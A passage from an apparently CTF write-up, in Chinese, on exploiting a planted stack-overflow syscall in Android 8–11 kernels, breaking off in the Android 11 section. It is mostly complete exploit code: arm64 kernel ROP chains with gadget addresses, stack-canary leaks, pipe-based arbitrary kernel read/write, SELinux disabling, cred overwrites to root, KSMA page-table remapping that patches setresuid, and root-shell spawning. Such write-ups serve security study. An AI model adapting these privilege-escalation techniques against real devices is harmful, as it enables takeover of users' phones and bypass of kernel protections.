; add sp, sp, #0x80 ; ret\n\n*/\nvoid read_kernel(char* k_addr, char* u_addr){\n    int pipe_rw[2];\n    pipe(pipe_rw);\n    write(pipe_rw[1],(void*)k_addr,0x8);\n    read(pipe_rw[0],(void*)u_addr,0x8);\n}\n\nvoid write_kernel(char* k_addr, char* u_addr){\n    int pipe_rw[2];\n    pipe(pipe_rw);\n    write(pipe_rw[1],(void*)u_addr,0x8);\n    read(pipe_rw[0],(void*)k_addr,0x8);\n}\n\nvoid write_kernel4(char* k_addr, char* u_addr){\n    int pipe_rw[2];\n    pipe(pipe_rw);\n    write(pipe_rw[1],(void*)u_addr,0x4);\n    read(pipe_rw[0],(void*)k_addr,0x4);\n}\n\n\nint main(){\n\n    char* read_buf = malloc(0x200);\n    char* write_buf = malloc(0x200);\n    memset(read_buf, 0x0, 0x200);\n    memset(write_buf, 0x43, 0x100);\n\n    // char* test_str = \"aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaabzaacbaaccaacdaaceaacfaacgaachaaciaacjaackaaclaacmaacnaac\";\n    // strncpy(write_buf, test_str, 0x100);\n\n    k_stackof_read(read_buf, 0x200);\n    hexdump(read_buf, 0x200);\n    unsigned long real_k_sp = *((unsigned long*)&read_buf[0x100]);\n    printf(\"real_k_sp: 0x%lx\\n\",real_k_sp);     \n\n    *((unsigned long *)&write_buf[0x100]) = real_k_sp - 0x110;         // kernel rop, fake kernel sp\n    *((unsigned long *)&write_buf[0x108]) = gadget1;         // gadget\n    \n    *((unsigned long *)&write_buf[8*0]) = 0x0;          // ->x29\n    *((unsigned long *)&write_buf[8*1]) = gadget2;      // ->x30\n    *((unsigned long *)&write_buf[8*2]) = 2;            // <-sp  ->x29  \n    *((unsigned long *)&write_buf[8*3]) = gadget3;      // ->x30\n    *((unsigned long *)&write_buf[8*4]) = 4;\n    *((unsigned long *)&write_buf[8*5]) = 5;\n    *((unsigned long *)&write_buf[8*6]) = 6;   \n    *((unsigned long *)&write_buf[8*7]) = 7;\n    *((unsigned long *)&write_buf[8*8]) = 8;       \n    *((unsigned long *)&write_buf[8*9]) = 9;    \n    *((unsigned long *)&write_buf[8*10]) = 10;\n    *((unsigned long *)&write_buf[8*11]) = 11;   \n    *((unsigned long *)&write_buf[8*12]) = 12;   \n    *((unsigned long *)&write_buf[8*13]) = 13;    \n    *((unsigned long *)&write_buf[8*14]) = 14;\n    *((unsigned long *)&write_buf[8*15]) = 15;\n    *((unsigned long *)&write_buf[8*16]) = 16;          // <-sp  ->x29\n    *((unsigned long *)&write_buf[8*17]) = gadget4;     // ->x30  \n    *((unsigned long *)&write_buf[8*18]) = 18;\n    *((unsigned long *)&write_buf[8*19]) = 19;\n    *((unsigned long *)&write_buf[8*20]) = 20;          // <-sp\n    *((unsigned long *)&write_buf[8*21]) = 21;\n    *((unsigned long *)&write_buf[8*22]) = real_k_sp;          // ->x29\n    *((unsigned long *)&write_buf[8*23]) = KERNEL_RET;          // ->x30 \n\n    addr_limit_addr = (real_k_sp&0xffffffffffffc000)+0x8;       // thread_info->addr_limit\n    *((unsigned long *)&write_buf[8*26]) = addr_limit_addr - 0x38;         // x9 when control flow hijacked, set it addr_limit-0x38 \n\n\n    hexdump(write_buf, 0x200);\n    k_stackof_write(write_buf,0x110);\n    // k_stackof_write(write_buf,0x100);\n\n// write selinux\n    unsigned long t_data = 0;\n    write_kernel4((void*)selinux_enforcing_addr, &t_data);\n    // printf(\"kernel info: %s\\n\",strerror(errno));\n    read_kernel((void*)selinux_enforcing_addr, &t_data);\n    printf(\"t_data: 0x%lx\\n\",t_data);\n\n// write cred\n    unsigned long thread_info_addr = (real_k_sp&0xffffffffffffc000);\n    unsigned long task_addr = 0;\n    read_kernel((void*)(thread_info_addr+0x10), &task_addr);\n    printf(\"task_addr: 0x%lx\\n\", task_addr);\n\n    unsigned long cred_addr = 0;\n    read_kernel((void*)(task_addr+0x5D8), &cred_addr);\n    printf(\"task_addr: 0x%lx\\n\", cred_addr);\n\n    int root_id = 0;    \n\twrite_kernel4((char*)(cred_addr+4), (char*)&root_id);\n\twrite_kernel4((char*)(cred_addr+8), (char*)&root_id);\n\twrite_kernel4((char*)(cred_addr+12), (char*)&root_id);\n\twrite_kernel4((char*)(cred_addr+16), (char*)&root_id);\n\twrite_kernel4((char*)(cred_addr+20), (char*)&root_id);\n\twrite_kernel4((char*)(cred_addr+24), (char*)&root_id);\n\twrite_kernel4((char*)(cred_addr+28), (char*)&root_id);\n\twrite_kernel4((char*)(cred_addr+32), (char*)&root_id);\n\n\tunsigned long root_cap = 0xffffffffffffffff;\n\twrite_kernel((char*)cred_addr+0x28, (char*)&root_cap);\n\twrite_kernel((char*)cred_addr+0x30, (char*)&root_cap);\n\twrite_kernel((char*)cred_addr+0x38, (char*)&root_cap);\n\twrite_kernel((char*)cred_addr+0x40, (char*)&root_cap);\n\twrite_kernel((char*)cred_addr+0x48, (char*)&root_cap);\n    \n    printf(\"get shell\\n\");\n    system(\"/system/bin/sh\");\n\n    printf(\"exit\\n\");\n    return 0;\n}\n```\n\n\n\n## android 9\n\n> 内核版本：linux 3.18.94\n\n利用思路跟android8完全一致，重新找了如下gadget：\n\n```c\nunsigned long gadget1 = 0xffffffc0000a20f8;     //  : sub sp, x29, #0x10 ; mov w0, #0 ; ldp x29, x30, [sp, #0x10] ; add sp, sp, #0x20 ; ret\nunsigned long gadget2 = 0xffffffc00016f658;     //  : mov x0, x9 ; ldp x29, x30, [sp], #0x70 ; ret\nunsigned long gadget3 = 0xffffffc0003dc454;     //  : str x2, [x0, #0x38] ; ldp x29, x30, [sp], #0x20 ; ret\nunsigned long gadget4 = 0xffffffc0000de7a8;     //  : ldp x29, x30, [sp, #0x10] ; add sp, sp, #0x70 ; ret\n```\n\n本地 root shell\n\n![image-20230906135614067](image-20230906135614067.png?size=600)\n\n\n\nexp如下：\n\n```c\n#define _GNU_SOURCE\n#include <pthread.h>\n#include <stdio.h>\n#include <stdlib.h>\n#include <netinet/ip.h>\n#include <sys/syscall.h>\n#include <sys/mman.h>\n#include <sys/uio.h>\n#include <sys/resource.h>\n#include <string.h>\n#include <fcntl.h>\n#include <sys/socket.h>\n#include <netinet/in.h>\n#include <linux/net.h>\n#include <errno.h>\n#include <signal.h>\n\n#define SYS_STACKOF 601\n#define KERNEL_RET 0xFFFFFFC0000BECC8 \n\nunsigned long arg1, arg2;\n\nunsigned long selinux_enforcing_addr = 0xFFFFFFC0009C3334;\nunsigned long addr_limit_addr = 0;\n\n#ifndef HEXDUMP_COLS\n#define HEXDUMP_COLS 16\n#endif\n\nvoid hexdump(void *mem, unsigned int len) {\n    putchar('\\n');\n    for(int i = 0; i < len + ((len % HEXDUMP_COLS) ? (HEXDUMP_COLS - len % HEXDUMP_COLS) : 0); i++) {\n        /* print offset */\n        if(i % HEXDUMP_COLS == 0) {\n            printf(\"0x%06x: \", i);\n        }\n\n        /* print hex data */\n        if(i < len) {\n            printf(\"%02x \", 0xFF & ((char*)mem)[i]);\n        }\n        /* end of block, just aligning for ASCII dump */\n        else {        \n            printf(\"   \");\n        }\n\n        /* print ASCII dump */\n        if(i % HEXDUMP_COLS == (HEXDUMP_COLS - 1)) {\n            for(int j = i - (HEXDUMP_COLS - 1); j <= i; j++) {\n                 /* end of block, not really printing */\n                if(j >= len) {\n                    putchar(' ');\n                }\n                /* printable char */\n                else if(isprint(((char*)mem)[j])) {\n                    putchar(0xFF & ((char*)mem)[j]);\n                }\n                 /* other char */\n                else {\n                    putchar('.');\n                }\n            }\n            putchar('\\n');\n        }\n    }\n    putchar('\\n');\n}\n\nk_stackof_read(void* addr, unsigned long len){\n    arg1 = addr;\n    arg2 = (len^0xdeadbeefdeadbeef);\n    printf(\"k_stackof_read - arg2: %lx\\n\",arg2);\n    syscall(SYS_STACKOF, arg1, arg2, 1);\n}\n\nk_stackof_write(void* addr, unsigned long len){\n    arg1 = addr;\n    arg2 = (len^0xdeadbeefdeadbeef);\n    printf(\"k_stackof_write - arg2: %lx\\n\",arg2);\n    syscall(SYS_STACKOF, arg1, arg2, 0);\n}\n\nunsigned long gadget1 = 0xffffffc0000a20f8;     //  : sub sp, x29, #0x10 ; mov w0, #0 ; ldp x29, x30, [sp, #0x10] ; add sp, sp, #0x20 ; ret\nunsigned long gadget2 = 0xffffffc00016f658;     //  : mov x0, x9 ; ldp x29, x30, [sp], #0x70 ; ret\nunsigned long gadget3 = 0xffffffc0003dc454;     //  : str x2, [x0, #0x38] ; ldp x29, x30, [sp], #0x20 ; ret\nunsigned long gadget4 = 0xffffffc0000de7a8;     //  : ldp x29, x30, [sp, #0x10] ; add sp, sp, #0x70 ; ret\n\nvoid read_kernel(char* k_addr, char* u_addr){\n    int pipe_rw[2];\n    pipe(pipe_rw);\n    write(pipe_rw[1],(void*)k_addr,0x8);\n    read(pipe_rw[0],(void*)u_addr,0x8);\n}\n\nvoid write_kernel(char* k_addr, char* u_addr){\n    int pipe_rw[2];\n    pipe(pipe_rw);\n    write(pipe_rw[1],(void*)u_addr,0x8);\n    read(pipe_rw[0],(void*)k_addr,0x8);\n}\n\nvoid write_kernel4(char* k_addr, char* u_addr){\n    int pipe_rw[2];\n    pipe(pipe_rw);\n    write(pipe_rw[1],(void*)u_addr,0x4);\n    read(pipe_rw[0],(void*)k_addr,0x4);\n}\n\n\nint main(){\n\n    char* read_buf = malloc(0x200);\n    char* write_buf = malloc(0x200);\n    memset(read_buf, 0x0, 0x200);\n    memset(write_buf, 0x43, 0x100);\n\n    // char* test_str = \"aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaabzaacbaaccaacdaaceaacfaacgaachaaciaacjaackaaclaacmaacnaac\";\n    // strncpy(write_buf, test_str, 0x100);\n\n    k_stackof_read(read_buf, 0x200);\n    hexdump(read_buf, 0x200);\n    unsigned long real_k_sp = *((unsigned long*)&read_buf[0x100]);\n    printf(\"real_k_sp: 0x%lx\\n\",real_k_sp);\n\n    *((unsigned long *)&write_buf[0x100]) = real_k_sp - 0x110;         // kernel rop, fake kernel sp\n    *((unsigned long *)&write_buf[0x108]) = gadget1;         // gadget\n    \n    *((unsigned long *)&write_buf[8*0]) = 0x0;          // ->x29\n    *((unsigned long *)&write_buf[8*1]) = gadget2;      // ->x30\n    *((unsigned long *)&write_buf[8*2]) = 2;            // <-sp  ->x29  \n    *((unsigned long *)&write_buf[8*3]) = gadget3;      // ->x30\n    *((unsigned long *)&write_buf[8*4]) = 4;\n    *((unsigned long *)&write_buf[8*5]) = 5;\n    *((unsigned long *)&write_buf[8*6]) = 6;   \n    *((unsigned long *)&write_buf[8*7]) = 7;\n    *((unsigned long *)&write_buf[8*8]) = 8;       \n    *((unsigned long *)&write_buf[8*9]) = 9;    \n    *((unsigned long *)&write_buf[8*10]) = 10;\n    *((unsigned long *)&write_buf[8*11]) = 11;   \n    *((unsigned long *)&write_buf[8*12]) = 12;   \n    *((unsigned long *)&write_buf[8*13]) = 13;    \n    *((unsigned long *)&write_buf[8*14]) = 14;\n    *((unsigned long *)&write_buf[8*15]) = 15;\n    *((unsigned long *)&write_buf[8*16]) = 16;          // <-sp  ->x29\n    *((unsigned long *)&write_buf[8*17]) = gadget4;     // ->x30  \n    *((unsigned long *)&write_buf[8*18]) = 18;\n    *((unsigned long *)&write_buf[8*19]) = 19;\n    *((unsigned long *)&write_buf[8*20]) = 20;          // <-sp\n    *((unsigned long *)&write_buf[8*21]) = 21;\n    *((unsigned long *)&write_buf[8*22]) = real_k_sp;          // ->x29\n    *((unsigned long *)&write_buf[8*23]) = KERNEL_RET;          // ->x30 \n\n    addr_limit_addr = (real_k_sp&0xffffffffffffc000)+0x8;       // thread_info->addr_limit\n    *((unsigned long *)&write_buf[8*26]) = addr_limit_addr - 0x38;         // x9 when control flow hijacked, set it addr_limit-0x38 \n\n    hexdump(write_buf, 0x200);\n    k_stackof_write(write_buf,0x110);\n    // k_stackof_write(write_buf,0x100);  \n\n// write selinux\n    unsigned long t_data = 0;\n    write_kernel4((void*)selinux_enforcing_addr, &t_data);\n    // printf(\"kernel info: %s\\n\",strerror(errno));\n    read_kernel((void*)selinux_enforcing_addr, &t_data);\n    printf(\"selinux_enforcing : 0x%lx\\n\",t_data);\n\n// write cred\n    unsigned long thread_info_addr = (real_k_sp&0xffffffffffffc000);\n    unsigned long task_addr = 0;\n    read_kernel((void*)(thread_info_addr+0x10), &task_addr);\n    printf(\"task_addr: 0x%lx\\n\", task_addr);\n\n    unsigned long cred_addr = 0;\n    read_kernel((void*)(task_addr+0x5D8), &cred_addr);\n    printf(\"cred_addr: 0x%lx\\n\", cred_addr);\n\n    int root_id = 0;    \n\twrite_kernel4((char*)(cred_addr+4), (char*)&root_id);\n\twrite_kernel4((char*)(cred_addr+8), (char*)&root_id);\n\twrite_kernel4((char*)(cred_addr+12), (char*)&root_id);\n\twrite_kernel4((char*)(cred_addr+16), (char*)&root_id);\n\twrite_kernel4((char*)(cred_addr+20), (char*)&root_id);\n\twrite_kernel4((char*)(cred_addr+24), (char*)&root_id);\n\twrite_kernel4((char*)(cred_addr+28), (char*)&root_id);\n\twrite_kernel4((char*)(cred_addr+32), (char*)&root_id);\n\n\tunsigned long root_cap = 0xffffffffffffffff;\n\twrite_kernel((char*)cred_addr+0x28, (char*)&root_cap);\n\twrite_kernel((char*)cred_addr+0x30, (char*)&root_cap);\n\twrite_kernel((char*)cred_addr+0x38, (char*)&root_cap);\n\twrite_kernel((char*)cred_addr+0x40, (char*)&root_cap);\n\twrite_kernel((char*)cred_addr+0x48, (char*)&root_cap);\n    \n    printf(\"get root shell\\n\");\n    system(\"/system/bin/sh\");\n\n    printf(\"exit\\n\");\n    return 0;\n}\n```\n\n\n\n## android 10\n\n> 内核版本：linux 4.14.175\n\n```bash\ngeneric_arm64:/ # cat /proc/iomem\n[...]\n40000000-bfffffff : System RAM\n  40080000-40b9ffff : Kernel code\n  40da0000-40f0ffff : Kernel data\n[...]\n```\n\n\n\n这个版本跟上一个版本相比，栈中多了cookie，函数返回时多了对cookie的检查。但cookie是固定值，可通过stackof_read() 泄露出来。\n\n所以，使用 stackof_write() 写返回地址时，提前将cookie布置好。rop完成一次任意地址写（不能动 X8 X9 X28三个寄存器），然后修复 x29 x30 sp，回到用户态。\n\n任意地址写直接使用KSMA方法改页表，重新映射整个内核镜像为用户态可读写，使用户态可以任意改写内核代码段和数据段。\n\n\n\n三条gadget：\n\n```c\nunsigned long gadget1 = 0xffffff8008464a0c;     // : sub sp, x29, #0x10 ; ldp x29, x30, [sp, #0x10] ; ldp x20, x19, [sp], #0x20 ; ret\nunsigned long gadget2 = 0xffffff80084f51c0;     //  : str x19, [x20, #0x10] ; ldp x29, x30, [sp, #0x10] ; ldp x20, x19, [sp], #0x20 ; ret\nunsigned long gadget3 = 0xffffff80080a745c;     // : ldp x29, x30, [sp], #0x80 ; ret\n```\n\n\n\n本地root shell：\n\n![image-20230906141248747](image-20230906141248747.png?size=600)\n\n\n\n\n\nexp如下：\n\n```c\n#define _GNU_SOURCE\n#include <pthread.h>\n#include <stdio.h>\n#include <stdlib.h>\n#include <netinet/ip.h>\n#include <sys/syscall.h>\n#include <sys/mman.h>\n#include <sys/uio.h>\n#include <sys/resource.h>\n#include <string.h>\n#include <fcntl.h>\n#include <sys/socket.h>\n#include <netinet/in.h>\n#include <linux/net.h>\n#include <errno.h>\n#include <signal.h>\n\n#define SYS_STACKOF 601\n#define KERNEL_RET 0xFFFFFFC0000BECC8 \n\nunsigned long arg1, arg2;\n\nunsigned long gadget1 = 0xffffff8008464a0c;     // : sub sp, x29, #0x10 ; ldp x29, x30, [sp, #0x10] ; ldp x20, x19, [sp], #0x20 ; ret\nunsigned long gadget2 = 0xffffff80084f51c0;     //  : str x19, [x20, #0x10] ; ldp x29, x30, [sp, #0x10] ; ldp x20, x19, [sp], #0x20 ; ret\nunsigned long gadget3 = 0xffffff80080a745c;     // : ldp x29, x30, [sp], #0x80 ; ret\n\n#ifndef HEXDUMP_COLS\n#define HEXDUMP_COLS 16\n#endif\n\nvoid hexdump(void *mem, unsigned int len) {\n    putchar('\\n');\n    for(int i = 0; i < len + ((len % HEXDUMP_COLS) ? (HEXDUMP_COLS - len % HEXDUMP_COLS) : 0); i++) {\n        /* print offset */\n        if(i % HEXDUMP_COLS == 0) {\n            printf(\"0x%06x: \", i);\n        }\n\n        /* print hex data */\n        if(i < len) {\n            printf(\"%02x \", 0xFF & ((char*)mem)[i]);\n        }\n        /* end of block, just aligning for ASCII dump */\n        else {        \n            printf(\"   \");\n        }\n\n        /* print ASCII dump */\n        if(i % HEXDUMP_COLS == (HEXDUMP_COLS - 1)) {\n            for(int j = i - (HEXDUMP_COLS - 1); j <= i; j++) {\n                 /* end of block, not really printing */\n                if(j >= len) {\n                    putchar(' ');\n                }\n                /* printable char */\n                else if(isprint(((char*)mem)[j])) {\n                    putchar(0xFF & ((char*)mem)[j]);\n                }\n                 /* other char */\n                else {\n                    putchar('.');\n                }\n            }\n            putchar('\\n');\n        }\n    }\n    putchar('\\n');\n}\n\nk_stackof_read(void* addr, unsigned long len){\n    arg1 = addr;\n    arg2 = (len^0xdeadbeefdeadbeef);\n    // printf(\"k_stackof_read - arg2: %lx\\n\",arg2);\n    syscall(SYS_STACKOF, arg1, arg2, 1);\n}\n\nk_stackof_write(void* addr, unsigned long len){\n    arg1 = addr;\n    arg2 = (len^0xdeadbeefdeadbeef);\n    // printf(\"k_stackof_write - arg2: %lx\\n\",arg2);\n    syscall(SYS_STACKOF, arg1, arg2, 0);\n}\n\n\n#define IMAGE_PHYS_ADDR 0x40080000\n#define RE_MAP_ADDR 0xFFFFFFC200000000\n#define IMAGE_BASE 0xFFFFFF8008080000\n\nunsigned long selinux_enforcing_addr = 0xFFFFFF8008EDA770;\nunsigned long SYMBOL__swapper_pg_dir = 0xffffff8008f0c000;\n\nunsigned long d_block_addr;\nunsigned long d_block;\n\nvoid init_mirror(unsigned long kernel_phys, unsigned long mirror_base) {\n\n    int index1 = (mirror_base & 0x0000007fc0000000) >> 30; // bits[39:31]\n    d_block_addr = SYMBOL__swapper_pg_dir + index1 * 8;  // target Table Descriptor Address\n    printf(\"descriptor: 0x%lx + %d x 8 = 0x%lx\\n\", SYMBOL__swapper_pg_dir, index1, d_block_addr);\n\n    d_block = 0;\n    d_block |= 0x1 ; // Block entry\n    /* Lower attributes */\n    d_block |= (1u << 11); // bits[11], nG\n    d_block |= (1u << 10); // bits[10], AF\n    d_block |= (1u << 9); // bits[9], SH[1]\n    d_block |= 0x40; // bits[7:6], AP[2:1] = 01\n    d_block |= 0x20; // bits[5], NS\n    d_block |= 0x10; // bits[2:0], AttrIndx[2:0]\n    d_block |= (kernel_phys & 0x0000ffffc0000000); // bits[47:30], output address\n    /* Upper attributes */\n    d_block |= (1ul << 52); // bits[52], Contiguous\n    d_block |= (1ul << 53); // bits[53], PXN\n    d_block |= (1ul << 54); // bits[54], XN\n    printf(\"d_block = 0x%lx\\n\", d_block);\n}\n\n\nint main(){\n\n    init_mirror(IMAGE_PHYS_ADDR, RE_MAP_ADDR);\n\n    char* read_buf = malloc(0x200);\n    char* write_buf = malloc(0x200);\n    memset(read_buf, 0x0, 0x200);\n    memset(write_buf, 0x0, 0x200);\n\n    k_stackof_read(read_buf, 0x200);\n    hexdump(read_buf, 0x200);\n    unsigned long real_k_sp = *((unsigned long*)&read_buf[0x100]);\n    printf(\"real_k_sp: 0x%lx\\n\",real_k_sp);\n\n    unsigned long k_cookie = *((unsigned long*)&read_buf[0x100]);\n    unsigned long k_x28 = *((unsigned long*)&read_buf[0x108]);\n    // unsigned long k_cookie_2 = *((unsigned long*)&read_buf[0x110]);\n    unsigned long k_x29 = *((unsigned long*)&read_buf[0x118]);          // 控制流劫持后，需要返回用户态时保持值\n    unsigned long k_x30 = *((unsigned long*)&read_buf[0x120]);          // 控制流劫持后，需要返回用户态时保持值\n    // unsigned long k_x29_2 = *((unsigned long*)&read_buf[0x128]);\n    // unsigned long k_x30_2 = *((unsigned long*)&read_buf[0x130]);\n\n    sleep(1);\n\n    /*padding*/\n    // memset(write_buf,0x42,0x100);\n\n    /*gadget*/ /* str x19, [x20, #0x10] */\n    *((unsigned long*)&write_buf[0x68]) = d_block_addr-0x10;         // -> x20 : d_block_addr-0x10\n    *((unsigned long*)&write_buf[0x70]) = d_block;         // -> x19 : d_block\n    *((unsigned long*)&write_buf[0x78]) = 0x0;         // -> x29 : x\n    *((unsigned long*)&write_buf[0x80]) = gadget2;         // -> x30 : gadget2\n    *((unsigned long*)&write_buf[0x88]) = 0x0;         // -> x20 : x\n    *((unsigned long*)&write_buf[0x90]) = 0x0;         // -> x19 : x\n    *((unsigned long*)&write_buf[0x98]) = 0x0;         // -> x29 : x\n    *((unsigned long*)&write_buf[0xa0]) = gadget3;         // -> x30 : gadget3\n    *((unsigned long*)&write_buf[0xa8]) = k_x29;         // -> x29 : k_x29\n    *((unsigned long*)&write_buf[0xb0]) = k_x30;         // -> x30 : k_x30\n\n\n    *((unsigned long*)&write_buf[0x100]) = k_cookie;\n    *((unsigned long*)&write_buf[0x108]) = k_x28;\n    *((unsigned long*)&write_buf[0x110]) = k_cookie;\n    *((unsigned long*)&write_buf[0x118]) = k_x29-0xb0;           // x29 \n    *((unsigned long*)&write_buf[0x120]) = gadget1;           // x30 gadget1\n    // *((unsigned long*)&write_buf[0x128]) = 0;           // second x29\n    // *((unsigned long*)&write_buf[0x130]) = 0;           // second x30\n\n    hexdump(write_buf, 0x200);\n    k_stackof_write(write_buf,0x128);\n    // k_stackof_write(write_buf,0x100);\n\n\n// write kernel image\n    /* selinux_enforcing*/\n    unsigned long selinux_enforcing_addr_new = RE_MAP_ADDR + 0x80000 + (selinux_enforcing_addr - IMAGE_BASE);\n    printf(\"selinux_enforcing_addr_new: 0x%lx\\n\", selinux_enforcing_addr_new);\n    *(int*)selinux_enforcing_addr_new = 0x0;\n\n    /* sys_setresuid*/\n    unsigned long setresuid_if_addr = 0xFFFFFF80080C7074;\n    unsigned long setresuid_if_addr_new = RE_MAP_ADDR + 0x80000 + (setresuid_if_addr - IMAGE_BASE);\n    *(char *)(setresuid_if_addr_new+3) = 0x36;\n    printf(\"setresuid_if_addr_new content: 0x%lx\\n\",*(unsigned long*)setresuid_if_addr_new);\n\n    /* sys_setresgid*/\n    unsigned long setresgid_if_addr = 0xFFFFFF80080C7524;\n    unsigned long setresgid_if_addr_new = RE_MAP_ADDR + 0x80000 + (setresgid_if_addr - IMAGE_BASE);\n    *(char *)(setresgid_if_addr_new+3) = 0x36;\n    printf(\"setresgid_if_addr_new content: 0x%lx\\n\",*(unsigned long*)setresgid_if_addr_new);\n\n\n    setresuid(0,0,0);\n    setresgid(0,0,0);\n\n    system(\"/system/bin/sh\");\n\n    printf(\"exit\\n\");\n\n    return 0;\n}\n```\n\n\n\n## android 11\n\n> 内核版本： linux 5.4.50\n\n比赛期间这个题没继续往后做，以为shadow stack无法绕过（x18寄存器）。但赛后看别人做出来了，于是自己也想尝试一下，发现其实还是可以解的。\n\n### 任意地址写\n\n在有shadow stack的情况下，虽然无法直接通过栈溢出写返回地址来控制流劫持，但还可以考虑这两个方向：\n\n1. 返回过程中是否有函数指针？\n2. 返回过程中是否有可控的地址写？如STR,STP配合可控寄存器。\n\n\n\n对于本题：\n\n1. 跟踪返回的流程，唯一的一个函数指针，用于调用_arm64_sys_stackof 函数了。返回时不会再执行。\n\n2. 跟踪返回流程，发现 0xFFFFFFC010209F7C 处会将 copy_from_user 函数的返回值存放到 x19 寄存器指向的内存处。而x19是上一个函数从栈上取出的，由于我们有超强的栈溢出能力，所以覆写x19对应的位置，就能达到任意地址写——copy_from_user的返回值。\n\n   ```bash\n   _arm64_sys_stackof\n   .kernel:FFFFFFC010257824                 BL              sys_stackof_handler\n   .kernel:FFFFFFC010257828                 ADRP            X9, #__stack_chk_guard@PAGE\n   .kernel:FFFFFFC01025782C                 LDUR            X8, [X29,#var_8]\n   .kernel:FFFFFFC010257830                 LDR             X9, [X9,#__stack_chk_guard@PAGEOFF]\n   .kernel:FFFFFFC010257834                 CMP             X9, X8\n   .kernel:FFFFFFC010257838                 B.NE            loc_FFFFFFC010257854\n   .kernel:FFFFFFC01025783C                 ADD             SP, SP, #0x810\n   .kernel:FFFFFFC010257840                 LDP             X20, X19, [SP,#var_s20]\n   .kernel:FFFFFFC010257844                 LDP             X28, X21, [SP,#var_s10]\n   .kernel:FFFFFFC010257848                 LDP             X29, X30, [SP+var_s0],#0x30\n   .kernel:FFFFFFC01025784C                 LDR             X30, [X18,#-8]!\n   .kernel:FFFFFFC010257850                 RET        \n                                            # /* RET到0xFFFFFFC010209F58*/\n   \n   el0_svc_common\n   .kernel:FFFFFFC010209F54                 BLR             X20\n   .kernel:FFFFFFC010209F58                 B               loc_FFFFFFC010209F7C\n   .kernel:FFFFFFC010209F7C loc_FFFFFFC010209F7C                    ; CODE XREF: el0_svc_common+BC↑j\n   .kernel:FFFFFFC010209F7C                                         ; el0_svc_common+D8↑j\n   .kernel:FFFFFFC010209F7C                 STR             X0, [X19]\t\t\t \n   \t\t\t                             # /* x19可控，x0是0，往任意地址写0？*/\n   ```\n\n   copy_from_user的返回值构造花费了一些时间，返回值表示未成功拷贝的字节数，并且会将目标地址未成功拷贝的区域设置成0。幸好栈中黄框位置设置成全0时不影响程序流的执行。\n\n   ![image-20230906142425609](image-20230906142425609.png?size=600)\n\n\n\n### 写一级页表对应虚拟地址（X）\n\n直接写 (swapper_pg_dir+264*8) 区域会报错，”unable to handle kernel write to read-only memory at virtual address ffffffc0117e6840”。应该是为了安全考虑将该区域映射成只读的了。\n\n那么还有线性映射区可以考虑，经过测试得到本环境中线性映射区的起始地址是 0xffffff8000000000 。目标页表项对应的虚拟地址：\n\n```bash\n>>> hex(0xFFFFFFC0117E6000-0xFFFFFFC010080000)\n'0x1766000'\n>>> hex(264*8)\n'0x840'\n>>> hex(0xFFFFFF8000000000+0x80000+0x1766000+0x840)\n'0xffffff80017e6840'\n```\n\n但是写线性映射区时也是同样的错，”Unable to handle kernel write to read-only memory at virtual address ffffff80017e6840”。\n\n\n\n### 写一级页表虚拟地址对应页表项（✔）\n\n页面不可写，应该是页表项中设置其权限为只读了。于是往上一层考虑，去改这read-only区域对应的页表项，能否改成读写。\n\n```bash\nx/20gx 0xffffff80017e6840\n0xffffff80017e6840:     0x00680081c0000711      0x0068008200000711\n0xffffff80017e6850:     0x0068008240000711      0x0068008280000711\n0xffffff80017e6860:     0x00680082c0000711      0x0068008300000711\n0xffffff80017e6870:     0x0068008340000711      0x0068008380000711\n0xffffff80017e6880:     0x00680083c0000711      0x0000000000000000\n0xffffff80017e6890:     0x0000000000000000      0x0000000000000000\n\nFFFF FF80 017E 6840\n11111111 11111111 11111111 10000000 00000001 01111110 01101000 01000000\n0000000 00：0\n000001 011：11\n11110 0110：486\n\ngef➤  monitor xp /20gx 0xafbf7000+0xf30 \n# 【0xffffff80017e6840 对应的页表项为物理地址 0xafbf7f30，可以看到这个虚拟地址在页表项中被标记成了不可写】\n00000000afbf7f30: 0x00600000417e6793 0x00600000417e7793\n00000000afbf7f40: 0x00600000417e8793 0x00600000417e9793\n00000000afbf7f50: 0x00600000417ea793 0x00600000417eb793\n00000000afbf7f60: 0x00600000417ec793 0x00600000417ed793\n00000000afbf7f70: 0x00600000417ee793 0x00600000417ef793\n00000000afbf7f80: 0x00680000417f0713 0x00680000417f1713\n00000000afbf7f90: 0x00680000417f2713 0x00680000417f3713\n00000000afbf7fa0: 0x00680000417f4713 0x00680000417f5713\n00000000afbf7fb0: 0x00680000417f6713 0x00680000417f7713\n00000000afbf7fc0: 0x00680000417f8713 0x00680000417f9713\n\ngef➤  x/20gx 0xffffff8000000000+(0xafbf7f30-0x40000000)\n# 【于是找到物理地址 0xafbf7f30 对应到线性映射区的地址】\n0xffffff806fbf7f30:     0x00600000417e6793      0x00600000417e7793\n0xffffff806fbf7f40:     0x00600000417e8793      0x00600000417e9793\n0xffffff806fbf7f50:     0x00600000417ea793      0x00600000417eb793\n0xffffff806fbf7f60:     0x00600000417ec793      0x00600000417ed793\n0xffffff806fbf7f70:     0x00600000417ee793      0x00600000417ef793\n0xffffff806fbf7f80:     0x00680000417f0713      0x00680000417f1713\n0xffffff806fbf7f90:     0x00680000417f2713      0x00680000417f3713\n0xffffff806fbf7fa0:     0x00680000417f4713      0x00680000417f5713\n0xffffff806fbf7fb0:     0x00680000417f6713      0x00680000417f7713\n0xffffff806fbf7fc0:     0x00680000417f8713      0x00680000417f9713\n\n\n0xffffff806fbf7f30\n11111111 11111111 11111111 10000000 01101111 10111111 01111111 00110000\n0000000 01：1\n101111 101：381\n11111 0111：503\n\ngef➤  monitor xp /20gx 0xafa02be8\n00000000afa02be8: 0x00000000af884003 0x00000000af883003\ngef➤  monitor xp /20gx 0xaf884fb8\n# 【查看虚拟地址 0xffffff806fbf7f30 的页表项，发现是权限内核态可读写的，0x13对应00010011】\n00000000af884fb8: 0x00680000afbf7713 0x00680000afbf8713\n\n# 【所以考虑先通过任意地址写，将虚拟地址 0xffffff806fbf7f30 处页表项的权限改成用户和内核态可读写】\n#\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t0x00600000417e6753\n# 